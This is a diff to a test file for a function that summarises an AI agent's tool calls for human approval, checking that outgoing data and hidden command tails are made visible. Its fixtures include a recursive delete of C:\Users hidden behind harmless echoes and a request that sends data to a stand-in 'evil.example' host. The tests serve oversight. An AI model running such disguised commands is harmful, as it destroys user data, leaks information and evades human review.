@@ -85,7 +85,8 @@ describe('markApproved / wasApproved', () => {
 describe('summarizeArgs', () => {
   it('produces short human summaries', () => {
     expect(summarizeArgs('kill_process', { name: 'chrome.exe' })).toBe('Kill chrome.exe');
-    expect(summarizeArgs('http_request', { method: 'post', url: 'https://api.example.com/path?x=1' })).toBe('POST api.example.com/path');
+    expect(summarizeArgs('http_request', { method: 'post', url: 'https://api.example.com/path?x=1' })).toBe('POST api.example.com/path, sending 4 chars of data');
+    expect(summarizeArgs('http_request', { url: 'https://api.example.com/path' })).toBe('GET api.example.com/path');
     expect(summarizeArgs('write_file', { path: '~/x.txt', content: 'a'.repeat(1234) })).toBe('Write 1,234 chars to ~/x.txt');
     expect(summarizeArgs('outlook_send_email', { to: 'X', subject: 'Y', body: 'secret' })).toBe('Email to X, subject Y');
     expect(summarizeArgs('install_skill', { slug: 'twitter-poster' })).toBe('Install skill twitter-poster');
@@ -97,5 +98,14 @@ describe('summarizeArgs', () => {
     expect(out).toContain('some_tool');
     expect(out).not.toContain('abc');
     expect(out).not.toContain('hello');
+  });
+
+  it('never truncates silently — a hidden tail is called out', () => {
+    const cmd = 'echo harmless '.repeat(20) + '&& del /s /q C:\\Users';
+    const out = summarizeArgs('shell_exec', { command: cmd });
+    expect(out).toContain(`(+${cmd.length - 240} more chars)`);
+    expect(summarizeArgs('shell_exec', { command: 'dir' })).toBe('Run `dir`');
+    expect(summarizeArgs('http_request', { method: 'GET', url: 'https://evil.example/c?d=' + 'x'.repeat(500) }))
+      .toBe('GET evil.example/c, sending 503 chars of data');
   });
 });
